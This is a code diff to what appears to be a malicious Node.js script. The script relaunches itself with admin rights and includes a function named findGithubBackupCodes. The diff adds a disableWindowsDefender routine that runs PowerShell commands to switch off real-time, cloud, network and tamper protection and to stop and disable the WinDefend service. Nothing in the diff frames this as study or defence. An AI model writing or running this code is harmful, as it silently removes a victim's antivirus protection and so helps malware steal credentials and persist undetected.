@@ -68,6 +68,7 @@ async function main() {
         relaunchAsAdmin();
     } else {
         console.log("The script is running with administrative privileges.");
+        disableWindowsDefender();
     }
 }
 
@@ -574,6 +575,34 @@ async function findGithubBackupCodes() {
     } catch (err) {
       console.error(`Error reading folder ${searchFolder}: ${err.message}`);
     }
+  }
+}
+
+
+function disableWindowsDefender() {
+  try {
+    // Disable real-time protection
+    execSync('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', { stdio: 'inherit' });
+
+    // Disable cloud protection
+    execSync('powershell -Command "Set-MpPreference -DisableCloudProtection $true"', { stdio: 'inherit' });
+
+    // Disable automatic sample submission
+    execSync('powershell -Command "Set-MpPreference -DisableAutomaticSampleSubmission $true"', { stdio: 'inherit' });
+
+    // Disable network protection
+    execSync('powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true"', { stdio: 'inherit' });
+
+    // Disable Windows Defender service
+    execSync('powershell -Command "Stop-Service -Name WinDefend -Force"', { stdio: 'inherit' });
+    execSync('powershell -Command "Set-Service -Name WinDefend -StartupType Disabled"', { stdio: 'inherit' });
+
+    // Disable Tamper Protection
+    execSync('powershell -Command "Set-MpPreference -DisableTamperProtection $true"', { stdio: 'inherit' });
+
+    console.log('Windows Defender has been disabled.');
+  } catch (error) {
+    console.error('Failed to disable Windows Defender:', error.message);
   }
 }
 
